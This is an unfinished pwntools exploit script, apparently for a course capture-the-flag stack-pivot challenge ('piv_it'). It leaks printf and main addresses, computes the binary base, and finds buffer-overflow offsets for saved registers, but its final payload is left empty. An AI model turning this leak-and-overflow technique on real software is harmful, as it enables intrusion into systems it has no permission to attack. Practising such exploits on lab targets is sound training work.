#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './piv_it' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 5855 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
p.recvuntil(b"At: ", drop = True)
leak_printf = p.recvline()
log.info(f"printf @ {leak_printf}")
p.recvuntil(b"$ ", drop=True)
#read(0, buf, 0x80), no overflow
payload = b'a'
p.sendline(payload)
p.recvuntil(b"At: ", drop=True)
leak_main = p.recvline()
log.info(f"main @ {leak_main}")

binary_base = hex(int(leak_main, 16) - int(0x725))
log.info(f"binary base @ {binary_base}")

p.recvuntil(b"$ ", drop=True)
# read (0, buf, 0x38), buf @ frame offset -20
# can overflow
# payload = cyclic(int(0x38))
# ebx @ gaaa
# ebp @ haaa
# esp @ jaaa
# eip @ laaa

ebx_offset = cyclic_find("gaaa")
ebp_offset = cyclic_find("haaa")
esp_offset = cyclic_find("jaaa")
eip_offset = cyclic_find("laaa")

payload = fit({

})
p.sendline(payload)
p.interactive()

